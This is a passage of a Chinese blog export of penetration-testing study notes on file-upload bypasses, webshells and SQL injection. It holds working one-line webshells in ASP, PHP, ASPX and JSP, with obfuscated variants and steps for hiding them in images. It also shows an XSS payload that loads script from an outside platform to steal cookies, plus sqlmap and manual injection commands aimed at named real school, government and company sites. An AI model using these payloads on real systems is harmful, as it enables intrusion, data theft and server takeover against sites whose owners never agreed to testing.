如果文件内容检测设置得比较严格,那么上传攻击将变得非常困难,也可以说它是在代码层检测的最后一道关卡,如果它被突破了,就算没有代码层的漏洞,也给后面利用应用层的解析漏洞带来了机会. 绕过检测文件头 主要是检测文件内容开始处的文件幻数,比如图片类型的文件幻数如下: 要绕过jpg文件幻数检测就要在文件开头写下方的值 Value=FF D8 FF E0 00 10 4A 46 49 46 offset 1 2... 000000000 FF D8... JFIF 要绕过gif文件幻数检测就要在文件开头写下方的值 Value=47 49 46 38 39 61 GIF89a 在前面加一个jfif 在前面加一个gif89a 文件相关信息检测: 图像文件相关信息检测常用的就是getimagesize()函数,只需要把文件头部分伪造好就ok了,就是在幻数的基础上还加了一些文件信息,有点像下面的结构 GIF89a (...some binary data for image...)&lt;?php phpinfo();?&gt; (...skipping the rest of binary data...) 文件加载检测: 这个是最变态的检测了,一般是调用API或函数去进行文件加载测试常见的是图像渲染测试,再变态点的甚至是进行二次渲染(后面会提到)对渲染/加载测试的攻击方式是代码注入绕过对二次渲染的攻击方式是攻击文件加载器自身 先说一下对渲染/加载测试攻击,代码注入绕过,可以用图像处理软件对一张图片进行代码注入,用winhex看数据可以分析出这类工具的原理是: 在不破坏文件本身的渲染情况下找一个空白区进行填充代码,一般会是图片的注释区对于渲染测试基本上都能绕过,毕竟本身的文件结构是完整的. 绕过二次渲染 攻击函数本身 通过上传不完整的图片让其渲染函数暴露,然后攻击之. 第二种方法 对文件加载器进行溢出攻击. (调用图片内容的时候就执行了语句) 表单提交按钮 slblog.upload.com/sleditor/upload.asp 写入表单 &lt;input type=&quot;submit&quot; value=&quot;提交&quot; name=&quot;bb&quot;&gt; 上传a.asa 只有选择文件没有上传的,自己写一个上传就好了.]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记17-脚本木马原理与制作]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B017-%E8%84%9A%E6%9C%AC%E6%9C%A8%E9%A9%AC%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%B6%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[脚本木马的制作与原理 webshell(web后门,可以方便对网站进行修改) webshell制作原理 webshell使用技巧 webshell&quot;黑吃黑&quot; webshell的种类: 一句话木马 小马 大马 打包马 脱裤马 ... 一句话木马: 短小精悍,而且功能强大,隐蔽性非常好,在入侵中始终扮演着强大的作用. &lt;%execute request(&quot;value&quot;)%&gt; 工作原理: 黑客在注册信息的电子邮箱或者个人主页等中插入类似如下代码: &lt;%execute request(&quot;value&quot;)%&gt; 其中value是值,所以你可以更改自己的值,前面的request就是获取这个值 &lt;%eval request(&quot;value&quot;)%&gt;(现在比较多见的,而且字符少,对表单字数有限制的地方特别的实用) 当知道了数据库的URL,就可以利用本地一张网页进行连接得到Webshell.(不知道数据库也可以,只要知道&lt;%eval request(&quot;value&quot;)%&gt;这个文件被插入到哪一个ASP文件里面就可以了) 这就被称为一句话木马,它是基于B/S结构的. 常见写法: asp一句话木马: &lt;%eval request(&quot;c&quot;)%&gt; php一句话木马: &lt;?php @eval($_POST[value]);?&gt; aspx一句话木马: &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;value&quot;])%&gt; jsp一句话 &lt;%if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;/&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt; 一句话变形 &lt;?php $_REQUEST[&apos;a&apos;]($_REQUEST[&apos;b&apos;]);?&gt; &lt;%Eval(Request(chr(112)))%&gt; &lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;xindong&quot;))%&gt; &lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;5&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;%&gt; &lt;%a=request(&quot;gold&quot;)%&gt;&lt;%eval a%&gt; 将一句话木马放到网站之后,去连接它,网页是空白的. 中国菜刀去连接它,参数写value值(reg:cmd),然后整个网站就拿下了 中国菜刀-&gt;右侧配置-&gt;(数据库管理) 右键-&gt;虚拟终端-&gt;help SETP c:\windows\system32\cmd.exe 如果还是拒绝,只能是上传脚本了 123.php &lt;?php @eval($_REQUEST[&apos;xx&apos;]);(//这里的xx也可以叫做是密码) ?&gt; &lt;?php @system($_REQUEST[&apos;xx&apos;]);(//这里的xx也可以叫做是密码) ?&gt; -&gt;注入?xx=ipconfig &lt;?php @exec($_REQUEST[&apos;xx&apos;]);(//这里的xx也可以叫做是密码) ?&gt; 还要再加一个pre才行 如果有缓存,,可以右键重置缓存库 mantra第二行传参-&gt;xx=phpinfo(); jsp的做法: 菜刀可以 webshell-&gt;jsp-&gt;复制代码-&gt;aaa.jsp 将http://xxx/aaa.jsp复制 caidao-&gt;右键-&gt;第二个文件夹-&gt;第二个文件,代码复制 提交之后,访问,会报500错误. 菜刀-&gt;地址复制过来,密码添上 jsp一般选utf-8 (还有一款红色菜刀) 一句话图片马的制作: C32下做一句话 打开c32,把图片放里面,写入一句话保存..退出 cmd下做一句话 copy /b 1.jpg+1.asp 2.jpg win7下右键图片,在属性-&gt;详细信息-&gt;版权内插入一句话即可 mspaint画图-&gt;保存图片-&gt;右键-&gt;详细信息-&gt;版权 这种方法一般都能防护找到. 代码审计-&gt;C32 图片拖进去-&gt;十六进制,复制一句话代码-&gt;在十六进制最后粘贴 -&gt;直接连图片是没有作用的,还需要改一下. 常见的一句话客户端 一句话最常用的客户端为: 一句话客户端增强版 中国菜刀 中国砍刀 lanker一句话客户端 ZV新型PHP一句话木马客户端GUI版 小马 小马体积小,容易隐藏,隐蔽性强,最重要在于与图片结合一起上传之后可以利用nginx或者IIS6的解析漏洞来运行,不过功能少,一般只有上传等功能. 大马 大马体积比较大,一般50k以上.功能也多,一般都包括提权命令,磁盘管理,数据库连接接口,执行命令甚至有些以具备自带提权功能和压缩,解压缩网站程序的功能.这种马隐蔽性不好,而大多代码如不加密的话很多杀毒厂商开始追杀此类 程序. 提权拿服务器的 webshell使用技巧: 一句话使用: 首先,找到数据库是asp格式的网站,然后,以留言板,或者发表文章的方式,把一句话添加到asp数据库 ,或者加进asp网页 记住,我们的目的是把一句话&lt;%execute request(&quot;value&quot;)%&gt;&gt;添加到数据库,无论任何方式! 然后打开客户端(就是你电脑上面的那个htm文件),填上加入了一句话的asp文件,或者asp网页,然后进入此网站服务器. 内容编码 配合解析漏洞 配合文件包含 利用文件名溢出 多次编码打乱,用一些函数去绕waf 图片一般不会杀掉. webshell&quot;黑吃黑&quot; 找shell后门 查找后门: 查找webshell后门 找到后门地址 反搞webshell箱子 Mantra-&gt;右键-&gt;在网络-&gt;HTML找请求 按钮事件可能会导致后门触发 菜刀有后门,(300万箱子),会把自身数据传送过去 300w箱子:一句话,shell,有人用菜刀连shell,它就会把这些shell都会传到后门服务器上,然后就会获取使用菜刀这些人的 信息 箱子就俩文件-&gt;index.asp,caolist.asp 怎么反搞它呢? 用XSS平台打一个cookie http://pip3.win/xss.php?do=project&amp;act=viewcode&amp;ty=create&amp;id=16 xss代码: &lt;sCRiPt sRC=http://pip3.win/qtCa&gt;&lt;/sCrIpT&gt; http://127.0.0.1:99/shell?u=http://127.0.0.1:99/1.asp&amp;p=222 -&gt;后退-&gt;p.222改成&lt;sCRiPt sRC=http://pip3.win/qtCa&gt;&lt;/sCrIpT&gt; 然后在XSS网站右侧-&gt;test查看登录信息 如果能有cookie的话,就可以欺骗登录了 -&gt;漏洞利用-&gt;马哥 copy-&gt;访问-&gt;将cookie强制修改,就能登录后后门地址了 协议:http,tcp都可以 嗅探欺骗-&gt;WSE-&gt;抓包(用户名包跟密码包)-&gt;复制代码-&gt;mantra-&gt;url解码 (主要是抓http来抓的) tcp用???去抓(没听出来) 改host文件,这样可以阻止后门传送. 大马上传上去删不掉的,用替换,但不执行,然后删除]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记16-sqlmap讲解]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B016-sqlmap%E8%AE%B2%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[其他注入: (国外大学有HTTP头漏洞) sqlmap使用详解: SQLMAP介绍: sqlmap是一个由python语言编写的开源测试工具,它主要用来检测sql注入漏洞,是一款功能强大的sql漏洞检测利用工具. 它可以检测的数据库有:access,mssql,mysql,oracle,postgresql,db2,sqlite等. 可以进行sql盲注,union查询,显错注入,延迟注入,post注入,cookie注入等. 其他功能: 执行命令,列举用户,检测权限,自动破解,数据导出等功能. sqlmap安装: 下载地址: http://www.sqlmap.org 安装 首先需要安装python27环境 直接解压即可 更新 sqlmap.py --update 桌面-&gt;新建快捷方式 c:Windows\System32\cmd.exe 右键-&gt;属性-&gt;起始位置-&gt;复制sqlmap路径 基本参数 Sqlmap.py -h 查看帮助选项 is-dba 当前用户权限 dbs 所有数据库 current-db 网站当前数据库 users 所有数据库用户 current-user 当前数据库用户 tables 参数:列表名 columns 参数:列字段 dump 参数:下载数据 sqlmap.py -v 查看当前版本 --dump 获取表中的数据,包含列 --dump-all 转存DBMS数据库所有表项目 --level 测试等级(1-5),默认为1 读取数据库-&gt;读取表-&gt;读取表的列-&gt;获取内容 -D 指定数据库 -T 指定表 -C 指定列 --dbms=mysql oracle mssql 指定数控机 需要清除缓存才能检测漏洞 sqlmap.py -u &quot;url&quot; --flush--session -- boolean-based blind --存在盲注 it looks like &quot;MySQL&quot;,Do you want to skip for other DBMSes? --是否还需要检测其他DBMSes吗? Generic UNION query --UNION有注入 GET parameter &apos;id&apos; is vulnerable --id确实存在风险 Parameter:id&lt;GET&gt; 里面是注入的地方 -- --is-dba 看看是不是dba权限 --users 枚举所有用户 --passwords 枚举所有用户密码 --roles 列出数据库管理员角色 --privileges 列出数据库管理员权限 列举数据库系统的架构 sqlmap.py -u &quot;http://xx.com/int.php?id=1&quot; --schema --batch --exclude-sysdbs 探测等级 参数: --level 共有5个等级,默认为1,sqlmap使用 的payload可以在xml/payloads.xml中看到,你也可以根据相应的格式添加自己的payload 这个参数不仅影响使用哪些payload同时也会影响测试的注入点,GET和POST的数据都会测试,HTTP Cookie在level为2的时候就会测试,HTTP User-Agent/Referer头在level为3的时候就会测试. 总之,在你不确定哪个payload或者参数为注入点的时候,为了保证全面性,建议使用高的level值. 显示调试信息 -v 显示调试信息 有7个级别 0. 只显示python错误以及严重 的信息 1. 同时显示基本信息和警告信息(默认 ) 2. 同时显示debug信息 3. 同时显示注入的payload 4. 同时显示HTTP请求 5. 同时 显示HTTP响应头 6. 同时显示HTTP响应页面 风险等级 参数: --risk 共有四个风险等级,默认是1会测试大部分的测试语句,2会增加基于事件的测试语句,3会增加OR语句的SQL注入测试 在有些时候,例如在UPDATE的语句中,注入一个OR的测试语句,可能会导致更新的整个表,可能造成很大的风险 测试的语句同样可以在xml/payloads.xml中找到,你也可以自行添加payload 一般是调成level 3 --risk 3 获取目标: 参数: -u或者--url 格式:http(s)://targeturl[:port]/[...] 例如:python sqlmap.py -u url?id=1 参数:-u或者--url 格式:http(s)://targeturl[:port]/[...] 例如:python sqlmap.py -u &quot;url?id=1&quot; 从文本中获取多个目标扫描 参数:-m 文件中保存url格式如下,sqlmap会一个一个检测 www.target1.com/vuln1.php?q=foobar www.target2.com/vuln2.asp?id=1 www.target3.com/vuln3/id/1* url采集: 全选-&gt;inurl:www.jnxy.edu.cn inurl:asp?id= reg: -m 3.txt 获取http请求注入 参数:-r sqlmap可以从一个文本文件中获取HTTP请求,这样就可以跳过设置一些其他参数(比如cookie,POST数据,等等). 比如文本文件内如下: POST/vuln.php HTTP/1.1 Host:www.target.com User-Agent:Mozilla/4.0 id=1 reg: -r 数据包 处理Google搜索结果 参数:-g sqlmap可以测试注入Google的搜索结果中的GET参数(只获取前100个结果). reg: python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot; --data 此参数是把数据以POST方式提交,sqlmap会像检测GET参数一样检测POST的参数 例子: python sqlmap.py -u &quot;rul&quot; --data=&quot;id=1/username=admin&quot; --param-del 参数拆分字符 当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数. reg: python sqlmap.py -u &quot;url&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; --cookie 适用于cookie注入 将参加加入cookie注入测试 sqlmap -u &quot;url&quot; --cookie &quot;id=9&quot; --table --level 2 --referer,--headers,--proxy --referer sqlmap可以在请求中伪造HTTP中的referer,当--level参数设定为3或者3以上的时候会尝试对referer注入 --headers 可以通过--headers参数来增加额外的http头 --headers &quot;client-ip:1.1.1.1&apos;&quot; --proxy 使用--proxy代理是格式为:http://url:port reg: sqlmap.py -u &quot;url&quot; --current-user --proxy &quot;http://127.0.0.1:8080&quot; burp-&gt;监听-&gt;forward 时间控制: --delay 可以设定两个HTTP(s)请求间的延迟,设定为0.5的时候是半秒,默认是没有延迟的. --timeout 可以设定一个HTTP(s)请求请求超过多久判定为超时,10.5表示10.5秒,默认是30秒. 设定重试超时 -retries 当HTTP(s)超时时,可以设定重新尝试连接次数,默认是3次. 设定随机改变的参数值. //过安全狗 --delay=0.5 --current -db 线程是一次发几个包过去. --safe-url,--safe-freq 有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求,这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略,导致以后无法进行. 绕过这个策略有两种方式: 1.--safe-url:提供一个安全不错误的连接,每隔一段时间都会去访问一下. 2.--safe-freq:提供一个安全不错误的连接,每次测试请求之后都会再访问一遍安全连接. -p sqlmap默认测试所有的GET和POST参数,当--level的值大于等于2的时候也会测试HTTP Cookie头的值.当大于等于3的时候会测试User-Agent和HTTP Referer头的值.但是你可以手动用-p 参数设置想要测试的参数,reg:-p &quot;id,user-anget&quot; reg: -p &quot;sid=123&quot; --prefix,--suffix 有些环境中,需要在注入的payload的前面或者后面加一些字符,来保证payload的正常运行. reg:代码中是这样调用数据库的: $query=&quot;SELECT * FROM users WHERE id=(&apos; &quot;.$_GET[&apos; id&apos;].&quot;&apos;) LIMIT 0,1&quot;; 这时你就需要--prefix和--suffix参数了: python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&apos; )&quot; --suffix &quot;AND (&apos; abc&apos; =&apos; abc&quot; 这样执行的SQL语句变成: $query=&quot;SELECT * FROM users WHERE id=(&apos; 1 &apos;)&lt;&lt;PAYLOAD&gt;AND(&apos; abc&apos;=&apos;abc&apos;)LIMIT 0,1&quot;; --technique 这个参数可以指定sqlmap使用的探测技术,默认情况下会测试所有的方式. 支持的探测方式如下: B:Boolean-based blind SQL injection(布尔型注入) E:Error-based SQL injection(报错型注入) U:UNION query SQL injection(可联合查询注入) S:Stacked queries SQL injection(可多语句查询注入) T:Time-based blind SQL injection(基于时间延迟注入) reg: --technique=BE --union-cols 默认情况下sqlmap测试UNION查询注入会测试1-10个字段数,当--level为5的时候他会增加测试到50个字段数.设定--union-cols的值应该是一段整数,如:12-16,是测试12-16个字段数 --union-char 默认情况下sqlmap针对UNION查询的注入会使用NULL字符,但是有些情况下会造成页面返回失败,而一个随机整数是成功的,这是你可以用--union-char只定UNION查询的字符. 二阶SQL注入 reg: --union-char=1 --second-order 有些时候注入点输入的数据看返回结果的时候并不是当前的页面,而是另外的一个页面,这个时候就需要你指定到哪个页面获取响应判断真假.--second-order后门跟一个判断页面的URL地址. reg:--second-order &quot;第二个url&quot; --dump-all,--exclude-sysdbs 使用--dump-all参数获取所有数据库表的内容,可同时加上--exclude-sysdbs只获取用户数据库的表,需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库,因为有的管理员会把他当初用户数据库一样来使用它. --search,-C,-T,-D --search可以用来寻找特定的数据库名,所有数据库中的特定表名,所有数据库表中的特定字段. 可以在以下三种情况下使用: -C后跟着用逗号分割的列名,将会在所有数据库表中搜索指定的列名 -T后跟着用逗号分割的表名,将会在所有数据库中搜索指定的表名 -D后跟着用逗号分割的库名,将会在所有数据库中搜索指定的库名. --udf-inject,--shared-lib 你可以通过编译MySQL注入你自定义的函数(UDFs)或PostgreSQL在windows中共享库,DLL,或者Linux/Unix中共享对象,sqlmap将会问你一些问题,上传到服务器数据库自定义函数,然后根据你的选择执行他们,当你注入完成后,sqlmap将会移除它们 -s,-t 参数:-s sqlmap对每一个目标都会再output路径下自动生成一个SQLite文件,如果用户想指定读取的文件路径,就可以用这个参数. 保存HTTP(s)日志 参数:-t 这个参数需要跟一个文本文件,sqlmap会把HTTP(s)请求与响应的日志保存到那里. reg:--flush-session -t c:\123.txt --batch 用此参数,不需要用户输入,将会使用sqlmap提示的默认值一直运行下去. 强制使用字符编码 --charset 不适用sqlmap自动识别的(如HTTP头中的Content-Type)字符编码,强制指定字符编码如: --charset=GBK --flush-session 如果不想用之前缓存这个目标的session文件,可以使用这个参数.会清空之前的session,重新测试该目标 自动获取form表单测试 --hex 有时候字符编码的问题,可能导致数据丢失,可以使用hex函数来避免: reg: sqlmap.py -u &quot;url&quot; --banner --hex -v 3 --parse-errors --output-dir sqlmap默认把session文件跟结果文件保存在output文件夹下,用此参数可自定义输出路径,reg:--output-dir=/tmp 从响应中获取DBMS的错误信息 参数:--parse-errors 有时目标没有关闭DBMS的报错,当数据库语句错误时,会输出错误语句,用词参数可以回显出错误信息. --smart,--mobile 有时对目标非常多的URL进行测试,为节省时间,只对能够快速判断为注入的报错点进行注入,可以使用此参数. reg: $python sqlmap.py -u &quot;url&quot; --batch --smart --mobile 有时服务端只接收移动端的访问,此时可以设定一个手机的User-Agent来模仿手机登录. reg: --mobile --identify-waf,--check-waf sqlmap可以尝试找出WAF/IPS/IDS保护,方便用户做出绕过方式.目前大约支持30种产品的识别 WAF/IPS/IDS保护可能会对sqlmap造成很大的困扰,如果怀疑目标有此防护的话,可以使用此参数来测试.sqlmap将会使用一个不存在的参数来注入测试. reg:对一个受到ModSecurity WAF保护的MySQL例子: --identify-waf -v 3 web application firewall 注册表操作: 当数据库为MySQL,PostgreSQL或Microsoft SQL Server,并且当前web应用支持堆查询.当然,当前连接数据库的用户也需要有权限操作注册表. 读取注册表值 参数:--reg-read 写入注册表值 参数:--reg-add 删除注册表值 参数:--reg-del 注册表辅助选项 参数:--reg-key,--reg-value,--reg-data,--reg-type 需要配合之前三个参数使用,reg: --reg-add --key-&quot;注册表&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 暴力破解表名 参数:--common-tables 当使用--tables无法获取到数据库的表时,可以使用此参数. 通常是如下情况: 1.MySQL数据库版本小于5.0,没有information_schema表 2.数据库是Microsoft Access,系统表MSysObjects是不可读的(默认). 3.当前用户没有权限读取系统中保存数据结构的表的权限.暴力破解的表在txt/common-tables.txt文件中,你可以自己添加. (数据库出现,但是表名没出现) Xx --common-tables -D testdb --common-columns POST登录框注入: 注入点:http://testasp.vulnweb.com/Login.asp 几种注入方式: ./sqlmap.py -r search-test.txt -p tfUPass sqlmap -u &quot;url&quot; --forms sqlmap -u &quot;url&quot; --data &quot;tfUName=1&amp;tfUPass=1&quot; 搜索框注入: -r search-test.txt 伪静态注入: 注入点:http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html -u &quot;url*.html&quot; 延迟注入 --time-sec base64编码注入: -u &quot;url&quot; --tamper base64encode.py -dbs http://Im.yichang.gov.cn/ 请求时间延迟 参数:--time-sec 当使用继续时间的盲注时,时刻使用--time-sec参数设定延迟时间,默认是5秒. 执行sql语句 --sql-query=&quot;select @@version&quot; --sql-shell sqlmap自动检测确定使用哪种SQL注入技术,如何插入检索语句 如果是SELECT查询语句,sqlmap将会输出结果.如果是通过SQl注入执行其他语句,需要测试是否支持多语句执行SQL语句 文件读写: 从数据库服务器中读取文件 参数:--file-read 当数据库为MySQL,PostgreSQL或Microsoft SQL Server,并且当前用户有权限使用特定的函数.读取的文件可以是文本也可以是二进制文件 -u &quot;http://192.168.2.3:81/about/show.php?lang=cn&amp;id=22&quot; --file-read=&quot;url2&quot; 命令执行: 参数:--os-cmd,--os-shell 当数控为MySQL,postgreSQL或Microsoft SQL Server,并且当前用户有权限适用特定的函数 在MySQL,PostgreSQL,sqlmap上传一个二进制库,包含用户自定义的函数,sys_exec()和sys_eval() cmd 执行cmd命令(win) shell 执行当前用户命令 --os-shell 自动上传 脚本 返回shell]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记15-其他注入]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B015-%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[其他注入类型 提交方式注入 参数型注入 其他注入 常见的提交方式: GET 后面有?id= 这种形式的 POST COOKIE HEAD PUT OPTION POST注入: post提交方式主要适用于表单的提交 用于登录框的注入 (注册,登录,搜索...) 例如: www.cracer.com/admin.php 测试站点: http://testasp.vulnweb.com/login.asp?tfUPass=&amp;tfUName= 测试工具: pangolin sqlmap Xdcms+burp注入 admin&apos; 抓包-&gt;右键-&gt;repeater-&gt;Go 穿山甲-&gt;Load Form-&gt;输入网址-&gt;选中下方第一个 -&gt;URL,自己添上login.php-&gt;开始跑 -&gt;Select_all-&gt;Go sqlmap sql.py -u &quot;www...&quot; --form burp sqlmap块 是写参数的 reg:--form 将包放在文件里,sqlmap去读这个文件 sqlmap.py -r c:\2.txt sqlmap清缓存-&gt;C:-&gt;用户-&gt;sqlmap-&gt;output-&gt;192.168.0.10删掉 XDCMS全版本存在sql注入漏洞 需要使用代理抓包改包工具进行完成 sql exp %60%3D%28select20group_concat%28username%2C0x3a%2Cpassword%29%20from%20c_admin%20where%20id%3D1%29%23 post注入点可能是%5b位置 输入个&apos; 试试 在forward,注入sql exp,然后 forward,forward,forward..... Post注入利用工具 pangolin sqlmap sqlmap -u http://testasp.vulnweb.com/login.asp --data &quot;tfUPass=1&amp;tfUName=1&quot; POST手工 将包复制下来,将注入语句插入到*位置,然后sqlmap去跑 COOKIE注入 cookie提交用于账号密码的cookie缓存 还可以通过cookie注入来突破简单的防注入系统 测试站点: http://www.jnrcjt.com/onepage3.asp?id=30 sqlmap.py -u http://www.jnrcjt.com/onepage3.asp --coolie &quot;id=30&quot; --level 2 一般防get型注入,,弹窗的防注入 穿山甲-&gt;URL-&gt;cookie sqlmap.py -u &quot;http://...(无id)&quot; --cookie &quot;id=27&quot; --level 2 sqlmap.py -u &quot;http://...(无id)&quot; --cookie &quot;id=27&quot; --level 2 --table cookie手工注入: cookie中转(老技术) 清空地址栏,输入: javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 and 1=2&quot;)),然后去掉访问页面的? id=xxx 即输入http://soft.xxxxx.edu.cn/list.asp,返回正常 javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;1556 and 1=2 select 1,2,3,4,5,6,7,8,9,10,...,30 from admin&quot;)) 参数型注入: 数字类型注入 字符类型注入 搜索型注入 数字型注入: www.cracer.com/news.asp?id=11 select * from news where id=11 www.cracer.com/news.asp?id=11 and 1=1 select * from news where id=11 and 1=1 字符型注入: www.cracer.com/news.asp?id=你好 &apos;and 1=1 select * from news where id=&apos;你好&apos; and 1=1#&apos; www.cracer.com/news.asp?id=你好&apos; and 1=1 &apos; select * from news where id=&apos;你好&apos; and 1=1# select * from news where id=&apos;你好&apos; and 1=1 &apos; 搜索型注入: like 像 通配符 * sql通配符 %% &apos;单引号 select * from news where id=&quot;&apos;%like $id%&quot; http://127.0.0.1/search.asp?Field=Title&amp;BigClassName=&amp;SmallClassName=&amp;keyword=123&amp;Submit=%CB%D1%CB%F7 参数:keyword=123 &apos;%%&apos;and 1=2 and &apos;%&apos;=&apos;%&apos; 测试站点: http://028gujian.com/ http://www.ptc-asia.com/CN/CI/?CID=62 2%&apos;and 1=1 and &apos;%&apos;=&apos; 返回和单独输入2是一样的页面 2%&apos;and 1=2 and &apos;%&apos;=&apos; 返回不同 搜索123,然后抓包,txt保存包,SQLmap跑包 sqlmap.py -r c:\2.txt 2%&apos;and(select count(*)from mssysaccessobjects)&gt;0 and &apos;%&apos;=&apos; //返回正常. access数据库 2%&apos;and(select count(*)from admin_user)&gt;0 and &apos;%&apos;=&apos; //返回正常的话. 说明存在admin_user表 2%&apos;and(select count(username)from admin_user)&gt;0 and &apos;%&apos;=&apos; //返回正常的话. 说明存在username字段 2%&apos;and(select top 1 len(admin)from admin_user)&gt;4 and &apos;%&apos;=&apos; //返回正常的话. 说明username长度&gt;4 2%&apos;and(select top 1 len(username)from admin_user)=5 and &apos;%&apos;=&apos; //返回正常的话. 说明username长度=5 2%&apos;and(select top 1 len(password)from admin_user)=16 and &apos;%&apos;=&apos; //返回错误,看来密码不是16位md5加密的,或者没加密,32位加密或者更高 2010%&apos;and(select top 1 len(password)from admin_user)=32 and &apos;%&apos;=&apos;//返回正常,说明应该是32位加密 以下都是对应位置的ascii的编码,如果不是则返回错误 2%&apos;and(select top 1 asc(mid(password,1,1))from admin_user)=55 and &apos;%&apos;=&apos; 如果是:2010%&apos;and(select top 1 asc(mid(password,1,1))from admin_user)=48 and &apos;%&apos;=&apos;//返回错误,因为password字段第一个 字母ascii编码不是48,而是55.所以返回结果不同 搜索型注入 burpsuite sqlmap 1.先使用burp抓包,保存在1.txt文件里 sqlmap -r 1.txt --tables sqlmap -r 1.txt --columns -T &quot;admin&quot; sqlmap -r 1.txt --C &quot;admin.password&quot; -T &quot;manager&quot; --dump -v 2 //列内容 其他注入: 伪静态注入 延迟注入 base64注入 二阶注入 Phpv9 authkey注入 HTTP头注入 XML实体注入 伪静态注入: http://zcb.sxjgjt.com.cn/ http://zcb.sxjgjt.com.cn/index.php/Index/Ndetails/class/news/htmls/moving/id/1131.html http://zcb.sxjgjt.com.cn/index.php/Index/Ndetails/class/news/htmls/moving/id/1131 在.html前面写注入 (phpweb也是伪静态,不加html也能访问) (它也可以伪造成这样的) 延迟注入: 延迟注入是通过页面返回的时间来判断的 不同的mysql数据库版本,延迟注入语句也不同 mysql&gt;=5.0的可以使用sleep()进行查询 mysql&lt;5.0的可以使用benchmark()进行查询 benchmark用法 benchmark(n,sql语句)n为查询次数 通过查询次数增多时间变得缓慢来判断是否存在延迟 select benchmark(1000,select * from admin); ?id=1 and sleep(5) sleep()延迟注入用法 sleep可以强制产生一个固定的延迟 sleep()延迟注入核心原理 and if(true,sleep(5),0); ==IF(1=1,true,false); id=1 and sleep(5) 判断下是否存在延迟注入 and if(substring(user(),1,4)=&apos;root&apos;,sleep(5),1)判断当前用户 and if(MID(version(),1,1) LIKE 5,sleep(5),1)判断数据库版本信息是否为5 可以去猜解他的数据库名称 and if(ascii(substring(database(),1,4))&gt;100,sleep(5),1) sqlmap --time-sec 延迟注入 base64编码注入: 解码 $id=base64_decode($id); 构造语句 编码 $id=base64_encode($id); id=1返回错误,对1进行base64编码 sqlmap要用插件来跑,tamper-&gt;base64encode.py sqlmap.py -u &quot;http://xxx?id=1&quot; --tamper &quot;base64encode.py&quot; 二阶注入: SQL注入一般可分为两种,一阶注入(普通的SQL注入)和二阶SQL注入.一阶SQL注入发生在一个HTTP请求和响应中,系统对攻击输入立即反应执行. 一阶注入的攻击过程归纳如下: 1.攻击者在HTTP请求中提交恶意sql语句 2.应用处理恶意输入,使用恶意输入动态构建SQL语句 3.如果攻击实现,在响应中向攻击者返回结构 二阶注入,作为sql注入的一种,他不同于普通的SQL注入,恶意代码被注入到web应用中不立即执行,而是存储到后端数据库,在处理另一次不同请求时,应用检索到数据库中的恶意输入并利用它动态构建SQL语句,实现了攻击 二阶SQL注入的攻击过程归纳如下: 1.攻击者在一个HTTP请求中提交恶意输入 2.用于将恶意输入保存在数据库中 3.攻击者提交第二个HTTP请求 4.为处理第二个HTTP请求,应用检索存储在后端数据库中的恶意输入,动态构建SQL语句 5.如果攻击实现,在第二个请求的响应中向攻击者返回结果.. 测试站点: 74cms人才系统 简历填写中存在二阶注入 aa&apos;,&apos;fullname&apos;=user()# 注册的时候可能会存在二阶注入,存放在数据库中,当你再访问信息的时候,会出现数据库用户名密码 phpv9 authkey注入 利用exp爆出authkey (可以是百度搜索phpv9 authkey,然后随便找一个漏洞注入) (域名必须一致,才能使用) 